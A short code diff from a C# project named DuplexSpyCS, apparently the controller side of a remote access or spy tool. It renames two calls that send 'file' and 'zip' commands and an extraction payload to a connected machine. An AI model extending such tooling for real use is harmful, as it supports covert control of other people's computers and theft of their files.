@@ -146,7 +146,7 @@ namespace DuplexSpyCS
                     lsFiles.Add(entry[1]);
             }
             
-            v.encSend(2, 0, string.Join("|", new string[]
+            v.fnSendCommand(string.Join("|", new string[]
             {
                 "file",
                 "zip",
@@ -183,7 +183,7 @@ namespace DuplexSpyCS
                 checkBox1.Checked ? "1" : "0",
             });
 
-            v.encSend(2, 0, payload);
+            v.fnSendCommand(payload);
 
             AddLogs("Start extracting...");
         }
